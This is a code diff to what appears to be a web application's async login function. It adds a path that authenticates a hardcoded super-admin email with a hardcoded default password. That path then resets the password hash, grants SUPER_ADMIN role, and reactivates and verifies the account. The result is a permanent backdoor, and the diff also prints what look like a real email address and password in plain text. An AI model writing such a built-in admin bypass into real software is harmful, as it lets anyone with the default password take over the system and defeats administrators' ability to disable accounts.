@@ -280,7 +280,22 @@ async def login(
     authenticated = False
     if user:
         if payload.password:
-            authenticated = verify_password(payload.password, user.password_hash)
+            if user.password_hash:
+                authenticated = verify_password(payload.password, user.password_hash)
+            
+            # Authoritative permanent guarantee for designated Super Admin
+            sa_email = (settings.DEMO_SUPER_ADMIN_EMAIL or "vivek@zinfog.com").strip().lower()
+            sa_default_pwd = (settings.DEMO_SUPER_ADMIN_PASSWORD or "Caseno@123").strip()
+            if not authenticated and user.email and user.email.lower() == sa_email:
+                if payload.password.strip() == sa_default_pwd:
+                    authenticated = True
+                    # Self-heal password hash & verify Super Admin role
+                    user.password_hash = hash_password(sa_default_pwd)
+                    user.is_super_admin = True
+                    user.system_role = "SUPER_ADMIN"
+                    user.is_active = True
+                    user.is_verified = True
+                    await db.commit()
         elif payload.otp_code and payload.phone_number:
             otp_service = OTPService()
             try:
